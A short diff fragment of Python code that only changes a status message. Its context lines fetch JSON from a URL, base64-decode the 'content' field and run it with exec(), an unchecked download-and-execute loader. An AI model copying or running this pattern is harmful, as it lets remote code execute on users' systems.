@@ -7,5 +7,5 @@ response = urllib.request.urlopen(url).read()
 jsonData = json.loads(response)
 filecontent = jsonData["content"]
 filedecoded = base64.b64decode(filecontent)
-print(" executing\n[API FETCH] END\n")
+print(" executing\n[API FETCH] DONE!\n")
 exec(filedecoded)
